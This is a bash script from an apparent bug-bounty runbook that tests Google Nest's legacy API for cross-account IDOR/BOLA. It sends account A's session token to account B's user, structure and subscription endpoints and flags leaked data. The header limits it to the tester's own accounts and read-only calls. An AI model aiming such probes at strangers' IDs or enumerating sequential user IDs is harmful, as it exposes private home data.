#!/usr/bin/env bash
# =============================================================================
# Google VRP — Nest cross-account IDOR/BOLA test (home.nest.com legacy API)
# Portable: Termux / Linux / Pi.
#
# Capture (session2) revealed real endpoints with object IDs in the path/bucket:
#   POST /api/0.1/user/{userid}/app_launch
#   GET  /api/0.1/structure/{structureid}/entitlements
#   POST {transport}/v5/subscribe   (bucket read: structure.X / user.Y / device.Z)
# User IDs are short SEQUENTIAL integers (enumerable). The test: does account A's
# token authorize access to account B's user/structure/buckets? If yes => IDOR.
#
# ETHICS: tests ONLY our own two accounts (A and B). Never a stranger's id.
# Read-only (app_launch + subscribe are reads; NO /v5/put writes here). Tokens
# from env, masked, never committed. In scope (home.nest.com).
#
# PREP — capture BOTH accounts' ids (session2 proxy still running):
#   * A: from your capture — NEST_TOKEN_A (the "Basic g.0..." string),
#        NEST_UID_A=22529665, NEST_STRUCT_A=ba347612-...,
#        NEST_TRANSPORT=https://czfeNN-front01-iad01.transport.home.nest.com
#   * B: open an INCOGNITO browser (proxy on), log into home.nest.com as account B,
#        create a home; read NEST_UID_B (userid:) and NEST_STRUCT_B (structure.) from
#        the mitmdump output.
#
# Run:
#   NEST_TOKEN_A='Basic g.0...' NEST_UID_A=22529665 NEST_STRUCT_A=ba34... \
#   NEST_UID_B=<B id> NEST_STRUCT_B=<B struct> \
#   NEST_TRANSPORT=https://czfe53-front01-iad01.transport.home.nest.com \
#   OUTDIR=$HOME/nest3 bash runbooks/PI-RUNBOOK-nest-session3-idor.sh 2>&1 | tee $HOME/nest3/nest3.log
# =============================================================================
set -o pipefail
OUTDIR="${OUTDIR:-$HOME/nest3}"; export OUTDIR; mkdir -p "$OUTDIR"
: "${NEST_TOKEN_A:?set NEST_TOKEN_A='Basic g.0...' (account A token, keep private)}"
: "${NEST_UID_A:?set NEST_UID_A=<A numeric userid>}"
: "${NEST_STRUCT_A:?set NEST_STRUCT_A=<A structure uuid>}"
: "${NEST_UID_B:?set NEST_UID_B=<B numeric userid>}"
: "${NEST_STRUCT_B:?set NEST_STRUCT_B=<B structure uuid>}"
NEST_TRANSPORT="${NEST_TRANSPORT:-https://czfe53-front01-iad01.transport.home.nest.com}"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36'
R="https://home.nest.com"
echo "============================================================"
echo "NEST IDOR TEST  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "A uid=$NEST_UID_A struct=${NEST_STRUCT_A:0:8}…  B uid=$NEST_UID_B struct=${NEST_STRUCT_B:0:8}…"
echo "Own two accounts only. Read-only (no /put). Token masked, never committed."
echo "============================================================"; echo ""

APP_BODY='{"known_bucket_types":["structure","shared","topaz","device","where","quartz","user","user_settings","link","track","message_center","safety","widget_track"],"known_bucket_versions":[]}'

# helper: POST/GET with A's token; args: method url [bodyfile]  -> prints code, saves body
call(){ local m="$1" url="$2" bf="${3:-}" extra=()
  [ -n "$bf" ] && extra=(-H 'Content-Type: application/json' --data @"$bf")
  curl -s -L --max-time 25 -H "User-Agent: $UA" -H "Authorization: $NEST_TOKEN_A" \
    "${extra[@]}" -X "$m" -o "$OUTDIR/resp.bin" -w '%{http_code}' "$url" 2>/dev/null
}
# does the response contain B's id (=> A read B's data)?
leaked(){ grep -qiE "$NEST_STRUCT_B|\"$NEST_UID_B\"|user\.$NEST_UID_B|structure\.$NEST_STRUCT_B" "$OUTDIR/resp.bin" 2>/dev/null; }

printf '%s' "$APP_BODY" > "$OUTDIR/app.json"
: > "$OUTDIR/IDOR.txt"
verdict(){ # label code
  local label="$1" code="$2" sz; sz=$(wc -c < "$OUTDIR/resp.bin")
  if [ "$code" = "200" ] && leaked; then
    echo "  *** [$code] $label  -> IDOR: response contains B's data ($sz b)"; echo "$label" >> "$OUTDIR/IDOR.txt"
    cp "$OUTDIR/resp.bin" "$OUTDIR/leak-$(printf '%s' "$label"|tr -c A-Za-z0-9 _).bin"
  elif [ "$code" = "200" ]; then echo "  [$code] $label  -> 200 ($sz b) but B's id not found — inspect"
  else echo "  [$code] $label  -> denied (good)"; fi
}

echo "═══ 0: BASELINE — A reads A's OWN (should be 200) ═══"
c=$(call POST "$R/api/0.1/user/$NEST_UID_A/app_launch" "$OUTDIR/app.json"); echo "  [$c] A app_launch(self)"
echo ""

echo "═══ 1: A -> B  user/app_launch (userid in path) ═══"
c=$(call POST "$R/api/0.1/user/$NEST_UID_B/app_launch" "$OUTDIR/app.json"); verdict "user.$NEST_UID_B/app_launch" "$c"
echo ""

echo "═══ 2: A -> B  structure entitlements (structure id in path) ═══"
c=$(call GET "$R/api/0.1/structure/$NEST_STRUCT_B/entitlements"); verdict "structure.$NEST_STRUCT_B/entitlements" "$c"
echo ""

echo "═══ 3: A -> B  bucket subscribe (transport /v5/subscribe) ═══"
for OK in "structure.$NEST_STRUCT_B" "user.$NEST_UID_B" "where.$NEST_STRUCT_B"; do
  printf '{"objects":[{"object_key":"%s","object_revision":1,"object_timestamp":1}]}' "$OK" > "$OUTDIR/sub.json"
  c=$(call POST "$NEST_TRANSPORT/v5/subscribe" "$OUTDIR/sub.json"); verdict "subscribe $OK" "$c"
done
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT"
echo "════════════════════════════════════════════"
if [ -s "$OUTDIR/IDOR.txt" ]; then
  echo "  *** CONFIRMED CROSS-ACCOUNT IDOR — A's token read B's data via:"
  sed 's/^/    /' "$OUTDIR/IDOR.txt"
  echo "  This is a real BOLA on Nest (account A reads account B's home/structure"
  echo "  data; user ids are sequential => mass-enumerable). Severity High+."
  echo "  NEXT (careful): test whether /v5/put can WRITE to B's structure/device"
  echo "  (cross-tenant control) — only on our own B, one benign field, then report."
else
  echo "  No cross-account read: Nest enforces per-object authorization. Clean."
  echo "  (Re-check tokens are fresh — they expire ~1h; 401 => re-capture.)"
fi
echo ""
echo "Evidence: $OUTDIR (responses local; token never committed)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
